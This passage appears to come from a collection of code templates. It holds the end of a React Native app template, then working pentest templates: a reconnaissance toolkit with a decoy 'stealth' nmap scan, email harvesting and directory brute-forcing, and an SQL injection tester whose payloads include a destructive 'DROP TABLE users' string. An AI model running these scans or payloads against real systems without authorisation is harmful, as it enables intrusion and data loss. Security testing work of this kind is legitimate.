  useEffect(() => {
    refetch();
  }, [url]);

  return { data, loading, error, refetch };
}

// Hook pour connexion réseau
function useNetworkStatus() {
  const [isConnected, setIsConnected] = useState<boolean | null>(null);

  useEffect(() => {
    const unsubscribe = NetInfo.addEventListener(state => {
      setIsConnected(state.isConnected);
    });

    return () => unsubscribe();
  }, []);

  return isConnected;
}

// Hook pour notifications
function useNotifications() {
  const [expoPushToken, setExpoPushToken] = useState('');

  useEffect(() => {
    registerForPushNotificationsAsync();
  }, []);

  const registerForPushNotificationsAsync = async () => {
    const { status: existingStatus } = await Notifications.getPermissionsAsync();
    let finalStatus = existingStatus;

    if (existingStatus !== 'granted') {
      const { status } = await Notifications.requestPermissionsAsync();
      finalStatus = status;
    }

    if (finalStatus !== 'granted') {
      alert('Failed to get push token for push notification!');
      return;
    }

    const token = (await Notifications.getExpoPushTokenAsync()).data;
    setExpoPushToken(token);
  };

  const sendLocalNotification = async (title: string, body: string) => {
    await Notifications.scheduleNotificationAsync({
      content: {
        title,
        body,
        data: { data: 'goes here' },
      },
      trigger: { seconds: 1 },
    });
  };

  return { expoPushToken, sendLocalNotification };
}

// ========================================
// ÉCRANS
// ========================================

// Écran de connexion
const LoginScreen: React.FC = ({ navigation }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const { login } = useAuth();

  const handleLogin = async () => {
    setLoading(true);
    try {
      await login(email, password);
    } catch (error) {
      Alert.alert('Error', error.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <KeyboardAvoidingView
      behavior={Platform.OS === 'ios' ? 'padding' : 'height'}
      style={styles.container}
    >
      <SafeAreaView style={styles.safeArea}>
        <View style={styles.loginContainer}>
          <Text style={styles.title}>Welcome Back</Text>

          <TextInput
            style={styles.input}
            placeholder="Email"
            value={email}
            onChangeText={setEmail}
            keyboardType="email-address"
            autoCapitalize="none"
            autoCorrect={false}
          />

          <TextInput
            style={styles.input}
            placeholder="Password"
            value={password}
            onChangeText={setPassword}
            secureTextEntry
          />

          <TouchableOpacity
            style={styles.button}
            onPress={handleLogin}
            disabled={loading}
          >
            {loading ? (
              <ActivityIndicator color="#fff" />
            ) : (
              <Text style={styles.buttonText}>Login</Text>
            )}
          </TouchableOpacity>

          <TouchableOpacity onPress={() => navigation.navigate('Register')}>
            <Text style={styles.link}>Don't have an account? Register</Text>
          </TouchableOpacity>
        </View>
      </SafeAreaView>
    </KeyboardAvoidingView>
  );
};

// Écran d'accueil avec liste
const HomeScreen: React.FC = () => {
  const [refreshing, setRefreshing] = useState(false);
  const { data: items, loading, refetch } = useApi<Item[]>('https://api.example.com/items');
  const isConnected = useNetworkStatus();

  const onRefresh = async () => {
    setRefreshing(true);
    await refetch();
    setRefreshing(false);
  };

  const renderItem = ({ item }: { item: Item }) => (
    <TouchableOpacity style={styles.itemCard}>
      <Image source={{ uri: item.imageUrl }} style={styles.itemImage} />
      <View style={styles.itemInfo}>
        <Text style={styles.itemTitle}>{item.title}</Text>
        <Text style={styles.itemDescription}>{item.description}</Text>
        <Text style={styles.itemPrice}>${item.price}</Text>
      </View>
    </TouchableOpacity>
  );

  if (!isConnected) {
    return (
      <View style={styles.centerContainer}>
        <Icon name="cloud-offline-outline" size={64} color="#ccc" />
        <Text style={styles.emptyText}>No internet connection</Text>
      </View>
    );
  }

  if (loading) {
    return (
      <View style={styles.centerContainer}>
        <ActivityIndicator size="large" color="#007AFF" />
      </View>
    );
  }

  return (
    <SafeAreaView style={styles.container}>
      <FlatList
        data={items}
        renderItem={renderItem}
        keyExtractor={item => item.id.toString()}
        refreshControl={
          <RefreshControl refreshing={refreshing} onRefresh={onRefresh} />
        }
        ListEmptyComponent={() => (
          <View style={styles.centerContainer}>
            <Text style={styles.emptyText}>No items found</Text>
          </View>
        )}
      />
    </SafeAreaView>
  );
};

// Écran de profil
const ProfileScreen: React.FC = () => {
  const { user, logout } = useAuth();
  const [image, setImage] = useState<string | null>(null);

  const pickImage = async () => {
    const { status } = await ImagePicker.requestMediaLibraryPermissionsAsync();

    if (status !== 'granted') {
      Alert.alert('Permission denied', 'We need camera roll permissions');
      return;
    }

    const result = await ImagePicker.launchImageLibraryAsync({
      mediaTypes: ImagePicker.MediaTypeOptions.Images,
      allowsEditing: true,
      aspect: [1, 1],
      quality: 0.8,
    });

    if (!result.canceled) {
      setImage(result.assets[0].uri);
    }
  };

  return (
    <SafeAreaView style={styles.container}>
      <ScrollView contentContainerStyle={styles.profileContainer}>
        <TouchableOpacity onPress={pickImage}>
          <Image
            source={{ uri: image || user?.avatar || 'https://via.placeholder.com/150' }}
            style={styles.avatar}
          />
          <View style={styles.editIcon}>
            <Icon name="camera" size={20} color="#fff" />
          </View>
        </TouchableOpacity>

        <Text style={styles.username}>{user?.name}</Text>
        <Text style={styles.email}>{user?.email}</Text>

        <View style={styles.statsContainer}>
          <View style={styles.stat}>
            <Text style={styles.statNumber}>42</Text>
            <Text style={styles.statLabel}>Posts</Text>
          </View>
          <View style={styles.stat}>
            <Text style={styles.statNumber}>1.2K</Text>
            <Text style={styles.statLabel}>Followers</Text>
          </View>
          <View style={styles.stat}>
            <Text style={styles.statNumber}>350</Text>
            <Text style={styles.statLabel}>Following</Text>
          </View>
        </View>

        <TouchableOpacity style={styles.logoutButton} onPress={logout}>
          <Text style={styles.logoutText}>Logout</Text>
        </TouchableOpacity>
      </ScrollView>
    </SafeAreaView>
  );
};

// Écran de caméra
const CameraScreen: React.FC = () => {
  const [hasPermission, setHasPermission] = useState<boolean | null>(null);
  const [type, setType] = useState(Camera.Constants.Type.back);
  const cameraRef = React.useRef<Camera>(null);

  useEffect(() => {
    (async () => {
      const { status } = await Camera.requestCameraPermissionsAsync();
      setHasPermission(status === 'granted');
    })();
  }, []);

  const takePicture = async () => {
    if (cameraRef.current) {
      const photo = await cameraRef.current.takePictureAsync();
      console.log('Photo taken:', photo.uri);
    }
  };

  if (hasPermission === null) {
    return <View />;
  }
  if (hasPermission === false) {
    return <Text>No access to camera</Text>;
  }

  return (
    <View style={styles.cameraContainer}>
      <Camera style={styles.camera} type={type} ref={cameraRef}>
        <View style={styles.cameraButtons}>
          <TouchableOpacity
            style={styles.cameraButton}
            onPress={() => {
              setType(
                type === Camera.Constants.Type.back
                  ? Camera.Constants.Type.front
                  : Camera.Constants.Type.back
              );
            }}
          >
            <Icon name="camera-reverse" size={32} color="#fff" />
          </TouchableOpacity>

          <TouchableOpacity style={styles.captureButton} onPress={takePicture}>
            <View style={styles.captureButtonInner} />
          </TouchableOpacity>
        </View>
      </Camera>
    </View>
  );
};

// ========================================
// NAVIGATION
// ========================================

function TabNavigator() {
  return (
    <Tab.Navigator
      screenOptions={({ route }) => ({
        tabBarIcon: ({ focused, color, size }) => {
          let iconName;

          if (route.name === 'Home') {
            iconName = focused ? 'home' : 'home-outline';
          } else if (route.name === 'Search') {
            iconName = focused ? 'search' : 'search-outline';
          } else if (route.name === 'Camera') {
            iconName = focused ? 'camera' : 'camera-outline';
          } else if (route.name === 'Profile') {
            iconName = focused ? 'person' : 'person-outline';
          }

          return <Icon name={iconName} size={size} color={color} />;
        },
        tabBarActiveTintColor: '#007AFF',
        tabBarInactiveTintColor: 'gray',
      })}
    >
      <Tab.Screen name="Home" component={HomeScreen} />
      <Tab.Screen name="Search" component={SearchScreen} />
      <Tab.Screen name="Camera" component={CameraScreen} />
      <Tab.Screen name="Profile" component={ProfileScreen} />
    </Tab.Navigator>
  );
}

// Navigation principale
export default function App() {
  return (
    <AuthProvider>
      <NavigationContainer>
        <Stack.Navigator>
          <Stack.Screen
            name="Login"
            component={LoginScreen}
            options={{ headerShown: false }}
          />
          <Stack.Screen
            name="Main"
            component={TabNavigator}
            options={{ headerShown: false }}
          />
        </Stack.Navigator>
      </NavigationContainer>
    </AuthProvider>
  );
}

// ========================================
// STYLES
// ========================================

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#fff',
  },
  safeArea: {
    flex: 1,
  },
  centerContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
  loginContainer: {
    flex: 1,
    justifyContent: 'center',
    padding: 20,
  },
  title: {
    fontSize: 32,
    fontWeight: 'bold',
    marginBottom: 40,
    textAlign: 'center',
  },
  input: {
    height: 50,
    borderWidth: 1,
    borderColor: '#ddd',
    borderRadius: 8,
    paddingHorizontal: 16,
    marginBottom: 16,
    fontSize: 16,
  },
  button: {
    backgroundColor: '#007AFF',
    height: 50,
    borderRadius: 8,
    justifyContent: 'center',
    alignItems: 'center',
    marginTop: 8,
  },
  buttonText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: '600',
  },
  link: {
    color: '#007AFF',
    textAlign: 'center',
    marginTop: 16,
  },
  itemCard: {
    flexDirection: 'row',
    padding: 16,
    borderBottomWidth: 1,
    borderBottomColor: '#eee',
  },
  itemImage: {
    width: 80,
    height: 80,
    borderRadius: 8,
  },
  itemInfo: {
    flex: 1,
    marginLeft: 16,
  },
  itemTitle: {
    fontSize: 18,
    fontWeight: '600',
    marginBottom: 4,
  },
  itemDescription: {
    fontSize: 14,
    color: '#666',
    marginBottom: 4,
  },
  itemPrice: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#007AFF',
  },
  emptyText: {
    fontSize: 16,
    color: '#999',
    marginTop: 16,
  },
  profileContainer: {
    alignItems: 'center',
    padding: 20,
  },
  avatar: {
    width: 150,
    height: 150,
    borderRadius: 75,
  },
  editIcon: {
    position: 'absolute',
    right: 0,
    bottom: 0,
    backgroundColor: '#007AFF',
    width: 40,
    height: 40,
    borderRadius: 20,
    justifyContent: 'center',
    alignItems: 'center',
  },
  username: {
    fontSize: 24,
    fontWeight: 'bold',
    marginTop: 16,
  },
  email: {
    fontSize: 16,
    color: '#666',
    marginTop: 4,
  },
  statsContainer: {
    flexDirection: 'row',
    marginTop: 24,
    width: '100%',
    justifyContent: 'space-around',
  },
  stat: {
    alignItems: 'center',
  },
  statNumber: {
    fontSize: 20,
    fontWeight: 'bold',
  },
  statLabel: {
    fontSize: 14,
    color: '#666',
    marginTop: 4,
  },
  logoutButton: {
    marginTop: 32,
    backgroundColor: '#ff3b30',
    paddingVertical: 12,
    paddingHorizontal: 32,
    borderRadius: 8,
  },
  logoutText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: '600',
  },
  cameraContainer: {
    flex: 1,
  },
  camera: {
    flex: 1,
  },
  cameraButtons: {
    flex: 1,
    backgroundColor: 'transparent',
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'flex-end',
    padding: 20,
  },
  cameraButton: {
    alignSelf: 'flex-end',
    padding: 10,
  },
  captureButton: {
    width: 70,
    height: 70,
    borderRadius: 35,
    backgroundColor: 'transparent',
    borderWidth: 4,
    borderColor: '#fff',
    justifyContent: 'center',
    alignItems: 'center',
  },
  captureButtonInner: {
    width: 60,
    height: 60,
    borderRadius: 30,
    backgroundColor: '#fff',
  },
});
"""
    },

    # ========================================
    # PENTESTING - RECONNAISSANCE
    # ========================================
    
    "pentest_reconnaissance": {
        "patterns": ["pentest", "reconnaissance", "information gathering", "osint", "footprinting", "scanning"],
        "template": """
# ========================================
# PENTESTING - RECONNAISSANCE & OSINT
# ========================================

import nmap
import socket
import dns.resolver
import whois
import requests
from bs4 import BeautifulSoup
import shodan
import censys.certificates
import subprocess
import concurrent.futures
from typing import List, Dict, Any
import json
import re
from datetime import datetime

# ========================================
# PASSIVE RECONNAISSANCE
# ========================================

class PassiveRecon:
    '''Reconnaissance passive - Collecte d'informations publiques'''
    
    def __init__(self, target: str):
        self.target = target
        self.results = {}
        
    def whois_lookup(self) -> Dict[str, Any]:
        '''Effectuer une recherche WHOIS'''
        try:
            w = whois.whois(self.target)
            return {
                'domain_name': w.domain_name,
                'registrar': w.registrar,
                'creation_date': str(w.creation_date),
                'expiration_date': str(w.expiration_date),
                'name_servers': w.name_servers,
                'emails': w.emails,
                'org': w.org,
                'country': w.country
            }
        except Exception as e:
            return {'error': str(e)}
    
    def dns_enumeration(self) -> Dict[str, List[str]]:
        '''Énumération DNS complète'''
        records = {}
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.target, record_type)
                records[record_type] = [str(rdata) for rdata in answers]
            except Exception:
                records[record_type] = []
        
        return records
    
    def subdomain_enumeration(self, wordlist: List[str]) -> List[str]:
        '''Énumération de sous-domaines'''
        found_subdomains = []
        
        def check_subdomain(subdomain: str) -> str:
            domain = f"{subdomain}.{self.target}"
            try:
                socket.gethostbyname(domain)
                return domain
            except socket.gaierror:
                return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_subdomain, sub) for sub in wordlist]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    found_subdomains.append(result)
        
        return found_subdomains
    
    def shodan_search(self, api_key: str) -> Dict[str, Any]:
        '''Recherche Shodan pour le domaine'''
        try:
            api = shodan.Shodan(api_key)
            results = api.search(self.target)
            
            return {
                'total': results['total'],
                'hosts': [
                    {
                        'ip': host['ip_str'],
                        'port': host['port'],
                        'org': host.get('org', 'N/A'),
                        'os': host.get('os', 'N/A'),
                        'data': host['data'][:200]
                    }
                    for host in results['matches'][:10]
                ]
            }
        except Exception as e:
            return {'error': str(e)}
    
    def google_dorks(self) -> List[str]:
        '''Générer des Google Dorks pour la reconnaissance'''
        dorks = [
            f'site:{self.target}',
            f'site:{self.target} filetype:pdf',
            f'site:{self.target} filetype:xls',
            f'site:{self.target} filetype:sql',
            f'site:{self.target} inurl:admin',
            f'site:{self.target} inurl:login',
            f'site:{self.target} inurl:wp-admin',
            f'site:{self.target} intitle:"index of"',
            f'site:{self.target} ext:php inurl:?',
            f'site:{self.target} "error" | "warning"',
        ]
        return dorks
    
    def email_harvesting(self) -> List[str]:
        '''Collecter des emails depuis les moteurs de recherche'''
        emails = set()
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[A-Z|a-z]{2,}'
        
        # Recherche sur le site web
        try:
            response = requests.get(f'https://{self.target}', timeout=10)
            found_emails = re.findall(email_pattern, response.text)
            emails.update(found_emails)
        except:
            pass
        
        # Hunter.io API (nécessite une clé API)
        # TheHarvester integration possible ici
        
        return list(emails)
    
    def ssl_certificate_info(self) -> Dict[str, Any]:
        '''Extraire les informations du certificat SSL'''
        import ssl
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.target, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.target) as ssock:
                    cert = ssock.getpeercert()
                    
                    return {
                        'subject': dict(x[0] for x in cert['subject']),
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'version': cert['version'],
                        'serial_number': cert['serialNumber'],
                        'not_before': cert['notBefore'],
                        'not_after': cert['notAfter'],
                        'san': cert.get('subjectAltName', [])
                    }
        except Exception as e:
            return {'error': str(e)}
    
    def wayback_machine(self) -> List[str]:
        '''Récupérer les snapshots historiques'''
        try:
            url = f'http://web.archive.org/cdx/search/cdx?url={self.target}/*&output=json&collapse=urlkey'
            response = requests.get(url, timeout=10)
            data = response.json()
            
            snapshots = []
            for entry in data[1:11]:  # Top 10
                snapshots.append({
                    'timestamp': entry[1],
                    'url': entry[2],
                    'status': entry[4]
                })
            
            return snapshots
        except Exception as e:
            return {'error': str(e)}
    
    def run_full_passive_recon(self) -> Dict[str, Any]:
        '''Exécuter toute la reconnaissance passive'''
        print(f"[*] Starting passive reconnaissance for {self.target}")
        
        self.results['whois'] = self.whois_lookup()
        print("[+] WHOIS lookup complete")
        
        self.results['dns'] = self.dns_enumeration()
        print("[+] DNS enumeration complete")
        
        self.results['ssl_cert'] = self.ssl_certificate_info()
        print("[+] SSL certificate info retrieved")
        
        self.results['emails'] = self.email_harvesting()
        print("[+] Email harvesting complete")
        
        self.results['google_dorks'] = self.google_dorks()
        print("[+] Google dorks generated")
        
        self.results['wayback'] = self.wayback_machine()
        print("[+] Wayback machine data retrieved")
        
        return self.results

# ========================================
# ACTIVE RECONNAISSANCE - PORT SCANNING
# ========================================

class ActiveRecon:
    '''Reconnaissance active - Scan de réseau et de ports'''
    
    def __init__(self, target: str):
        self.target = target
        self.nm = nmap.PortScanner()
    
    def ping_sweep(self, network: str) -> List[str]:
        '''Effectuer un ping sweep sur un réseau'''
        print(f"[*] Performing ping sweep on {network}")
        self.nm.scan(hosts=network, arguments='-sn')
        
        alive_hosts = []
        for host in self.nm.all_hosts():
            if self.nm[host].state() == 'up':
                alive_hosts.append(host)
        
        return alive_hosts
    
    def tcp_syn_scan(self, ports: str = '1-1000') -> Dict[str, Any]:
        '''Scan SYN TCP (stealth scan)'''
        print(f"[*] Running TCP SYN scan on {self.target}")
        self.nm.scan(self.target, ports, arguments='-sS -T4')
        
        results = {}
        for host in self.nm.all_hosts():
            results[host] = {
                'hostname': self.nm[host].hostname(),
                'state': self.nm[host].state(),
                'protocols': {}
            }
            
            for proto in self.nm[host].all_protocols():
                results[host]['protocols'][proto] = {}
                ports = self.nm[host][proto].keys()
                
                for port in ports:
                    port_info = self.nm[host][proto][port]
                    results[host]['protocols'][proto][port] = {
                        'state': port_info['state'],
                        'name': port_info['name'],
                        'product': port_info['product'],
                        'version': port_info['version']
                    }
        
        return results
    
    def udp_scan(self, ports: str = '53,67,68,69,123,161,162') -> Dict[str, Any]:
        '''Scan UDP des ports communs'''
        print(f"[*] Running UDP scan on {self.target}")
        self.nm.scan(self.target, ports, arguments='-sU')
        
        return self._format_scan_results()
    
    def service_version_detection(self, ports: str = '1-1000') -> Dict[str, Any]:
        '''Détection de version des services'''
        print(f"[*] Running service version detection on {self.target}")
        self.nm.scan(self.target, ports, arguments='-sV -T4')
        
        return self._format_scan_results()
    
    def os_detection(self) -> Dict[str, Any]:
        '''Détection du système d'exploitation'''
        print(f"[*] Running OS detection on {self.target}")
        self.nm.scan(self.target, arguments='-O')
        
        results = {}
        for host in self.nm.all_hosts():
            if 'osmatch' in self.nm[host]:
                results[host] = {
                    'os_matches': [
                        {
                            'name': os['name'],
                            'accuracy': os['accuracy']
                        }
                        for os in self.nm[host]['osmatch']
                    ]
                }
        
        return results
    
    def aggressive_scan(self, ports: str = '1-65535') -> Dict[str, Any]:
        '''Scan agressif complet'''
        print(f"[*] Running aggressive scan on {self.target}")
        self.nm.scan(self.target, ports, arguments='-A -T4')
        
        return self._format_scan_results()
    
    def stealth_scan(self) -> Dict[str, Any]:
        '''Scan furtif pour éviter la détection'''
        print(f"[*] Running stealth scan on {self.target}")
        # Fragmentation, décoys, timing lent
        self.nm.scan(self.target, '1-1000', arguments='-sS -f -D RND:10 -T2')
        
        return self._format_scan_results()
    
    def vulnerability_scan(self) -> Dict[str, Any]:
        '''Scan de vulnérabilités avec scripts NSE'''
        print(f"[*] Running vulnerability scan on {self.target}")
        self.nm.scan(
            self.target,
            arguments='--script vuln'
        )
        
        results = {}
        for host in self.nm.all_hosts():
            if 'hostscript' in self.nm[host]:
                results[host] = self.nm[host]['hostscript']
        
        return results
    
    def _format_scan_results(self) -> Dict[str, Any]:
        '''Formater les résultats de scan'''
        results = {}
        for host in self.nm.all_hosts():
            results[host] = {
                'hostname': self.nm[host].hostname(),
                'state': self.nm[host].state(),
                'open_ports': []
            }
            
            for proto in self.nm[host].all_protocols():
                ports = self.nm[host][proto].keys()
                for port in ports:
                    if self.nm[host][proto][port]['state'] == 'open':
                        results[host]['open_ports'].append({
                            'port': port,
                            'protocol': proto,
                            'service': self.nm[host][proto][port]['name'],
                            'version': self.nm[host][proto][port].get('version', 'N/A')
                        })
        
        return results

# ========================================
# WEB APPLICATION RECONNAISSANCE
# ========================================

class WebRecon:
    '''Reconnaissance des applications web'''
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def technology_detection(self) -> Dict[str, Any]:
        '''Détecter les technologies utilisées'''
        try:
            response = self.session.get(self.url, timeout=10)
            
            technologies = {
                'server': response.headers.get('Server', 'Unknown'),
                'x_powered_by': response.headers.get('X-Powered-By', 'Unknown'),
                'cookies': list(response.cookies.keys()),
                'headers': dict(response.headers)
            }
            
            # Détection CMS
            content = response.text.lower()
            if 'wp-content' in content or 'wordpress' in content:
                technologies['cms'] = 'WordPress'
            elif 'joomla' in content:
                technologies['cms'] = 'Joomla'
            elif 'drupal' in content:
                technologies['cms'] = 'Drupal'
            
            # Détection JavaScript frameworks
            if 'react' in content:
                technologies['frontend'] = 'React'
            elif 'angular' in content:
                technologies['frontend'] = 'Angular'
            elif 'vue' in content:
                technologies['frontend'] = 'Vue.js'
            
            return technologies
            
        except Exception as e:
            return {'error': str(e)}
    
    def directory_brute_force(self, wordlist: List[str]) -> List[str]:
        '''Brute force de répertoires'''
        found_dirs = []
        
        def check_path(path: str) -> tuple:
            url = f"{self.url}/{path}"
            try:
                response = self.session.get(url, timeout=5, allow_redirects=False)
                if response.status_code in [200, 301, 302, 403]:
                    return (url, response.status_code)
            except:
                pass
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(check_path, path) for path in wordlist]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    found_dirs.append({'url': result[0], 'status': result[1]})
        
        return found_dirs
    
    def robots_txt_analysis(self) -> Dict[str, Any]:
        '''Analyser le fichier robots.txt'''
        try:
            response = self.session.get(f"{self.url}/robots.txt", timeout=10)
            if response.status_code == 200:
                lines = response.text.split('\\n')
                disallowed = [line.split(': ')[1] for line in lines if line.startswith('Disallow:')]
                allowed = [line.split(': ')[1] for line in lines if line.startswith('Allow:')]
                
                return {
                    'exists': True,
                    'disallowed': disallowed,
                    'allowed': allowed,
                    'full_content': response.text
                }
        except:
            pass
        
        return {'exists': False}
    
    def sitemap_discovery(self) -> List[str]:
        '''Découvrir les sitemaps'''
        sitemaps = []
        sitemap_locations = [
            '/sitemap.xml',
            '/sitemap_index.xml',
            '/sitemap1.xml',
            '/sitemap-index.xml'
        ]
        
        for location in sitemap_locations:
            try:
                response = self.session.get(f"{self.url}{location}", timeout=10)
                if response.status_code == 200:
                    sitemaps.append(location)
            except:
                pass
        
        return sitemaps
    
    def security_headers_check(self) -> Dict[str, Any]:
        '''Vérifier les headers de sécurité'''
        try:
            response = self.session.get(self.url, timeout=10)
            headers = response.headers
            
            security_headers = {
                'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
                'Content-Security-Policy': headers.get('Content-Security-Policy'),
                'X-Frame-Options': headers.get('X-Frame-Options'),
                'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
                'X-XSS-Protection': headers.get('X-XSS-Protection'),
                'Referrer-Policy': headers.get('Referrer-Policy'),
                'Permissions-Policy': headers.get('Permissions-Policy')
            }
            
            missing_headers = [k for k, v in security_headers.items() if v is None]
            
            return {
                'headers': security_headers,
                'missing': missing_headers,
                'score': len([v for v in security_headers.values() if v]) / len(security_headers) * 100
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def comment_extraction(self) -> List[str]:
        '''Extraire les commentaires HTML'''
        try:
            response = self.session.get(self.url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            comments = soup.find_all(string=lambda text: isinstance(text, str) and '<!--' in str(text))
            return [str(comment).strip() for comment in comments]
        except Exception as e:
            return []
    
    def form_discovery(self) -> List[Dict[str, Any]]:
        '''Découvrir tous les formulaires'''
        try:
            response = self.session.get(self.url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = []
            for form in soup.find_all('form'):
                form_details = {
                    'action': form.get('action'),
                    'method': form.get('method', 'get'),
                    'inputs': []
                }
                
                for input_tag in form.find_all('input'):
                    form_details['inputs'].append({
                        'name': input_tag.get('name'),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    })
                
                forms.append(form_details)
            
            return forms
            
        except Exception as e:
            return []

# ========================================
# SCRIPT D'EXÉCUTION COMPLET
# ========================================

def full_reconnaissance(target: str, shodan_api: str = None):
    '''Exécuter une reconnaissance complète'''
    print(f"\\n{'='*60}")
    print(f"FULL RECONNAISSANCE FOR: {target}")
    print(f"{'='*60}\\n")
    
    report = {
        'target': target,
        'timestamp': datetime.now().isoformat(),
        'passive_recon': {},
        'active_recon': {},
        'web_recon': {}
    }
    
    # Passive Recon
    print("\\n[*] PHASE 1: PASSIVE RECONNAISSANCE")
    passive = PassiveRecon(target)
    report['passive_recon'] = passive.run_full_passive_recon()
    
    # Active Recon
    print("\\n[*] PHASE 2: ACTIVE RECONNAISSANCE")
    active = ActiveRecon(target)
    report['active_recon']['service_scan'] = active.service_version_detection('1-1000')
    report['active_recon']['os_detection'] = active.os_detection()
    
    # Web Recon
    print("\\n[*] PHASE 3: WEB APPLICATION RECONNAISSANCE")
    web = WebRecon(f"https://{target}")
    report['web_recon']['technologies'] = web.technology_detection()
    report['web_recon']['security_headers'] = web.security_headers_check()
    report['web_recon']['robots_txt'] = web.robots_txt_analysis()
    report['web_recon']['forms'] = web.form_discovery()
    
    # Sauvegarder le rapport
    filename = f"recon_report_{target.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\\n[+] Report saved to: {filename}")
    return report

# EXEMPLE D'UTILISATION
if __name__ == "__main__":
    target = "example.com"
    report = full_reconnaissance(target)
"""
    },

    # ========================================
    # PENTESTING - WEB VULNERABILITIES
    # ========================================
    
    "pentest_web_vulnerabilities": {
        "patterns": ["pentest web", "sql injection", "xss", "csrf", "vulnerabilities", "owasp"],
        "template": """
# ========================================
# PENTESTING - WEB VULNERABILITIES (OWASP TOP 10)
# ========================================

import requests
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import re
import time
import hashlib
from typing import List, Dict, Any, Tuple
import base64
import json

# ========================================
# SQL INJECTION TESTING
# ========================================

class SQLInjectionTester:
    '''Testeur d'injections SQL'''
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
        self.payloads = self._load_sql_payloads()
        
    def _load_sql_payloads(self) -> List[str]:
        '''Charger les payloads SQL injection'''
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' OR 1=1 --",
            "') OR ('1'='1",
            "1' AND '1'='1",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' WAITFOR DELAY '0:0:5'--",
            "1'; DROP TABLE users--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--"
        ]
    
    def test_get_parameter(self, param: str) -> List[Dict[str, Any]]:
        '''Tester les injections SQL sur un paramètre GET'''
        vulnerabilities = []
        
        for payload in self.payloads:
            test_url = f"{self.url}?{param}={payload}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Détection basée sur des signatures d'erreur
                if self._detect_sql_error(response.text):
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'parameter': param,
                        'payload': payload,
                        'url': test_url,
                        'severity': 'CRITICAL',
                        'evidence': self._extract_error(response.text)
                    })
                
                # Détection basée sur le timing (Time-based)
                if 'SLEEP' in payload or 'WAITFOR' in payload or 'pg_sleep' in payload:
                    start = time.time()
                    response = self.session.get(test_url, timeout=15)
                    elapsed = time.time() - start
                    
                    if elapsed > 4:  # Si le temps de réponse est > 4 secondes
                        vulnerabilities.append({
                            'type': 'Time-based SQL Injection',
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'severity': 'CRITICAL',
                            'evidence': f'Response time: {elapsed:.2f}s'
                        })
                        
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def test_post_parameter(self, data: Dict[str, str]) -> List[Dict[str, Any]]:
        '''Tester les injections SQL sur les paramètres POST'''
        vulnerabilities = []
        
        for param in data.keys():
            for payload in self.payloads:
                test_data = data.copy()
                test_data[param] = payload
                
                try:
                    response = self.session.post(self.url, data=test_data, timeout=10)
                    
                    if self._detect_sql_error(response.text):
                        vulnerabilities.append({
                            'type': 'SQL Injection (POST)',
                            'parameter': param,
                            'payload': payload,
                            'severity': 'CRITICAL',
                            'evidence': self._extract_error(response.text)
                        })
                        
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _detect_sql_error(self, content: str) -> bool:
        '''Détecter les erreurs SQL dans la réponse'''
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"valid MySQL result",
            r"MySqlClient\\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*\\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\\.",
            r"Driver.*SQL Server",
            r"OLE DB.*SQL Server",
            r"\\WSQL Server.*Driver",
            r"SQLServer JDBC Driver",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_",
            r"Warning.*ora_",
            r"SQLSTATE",
            r"Unclosed quotation mark",
            r"Microsoft Access Driver",
            r"JET Database Engine",
            r"Access Database Engine"
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False
    
    def _extract_error(self, content: str) -> str:
        '''Extraire le message d'erreur'''
        lines = content.split('\\n')
        for line in lines:
            if any(keyword in line.lower() for keyword in ['error', 'warning', 'sql', 'syntax']):
                return line.strip()[:200]
        return "SQL error detected"

# ========================================
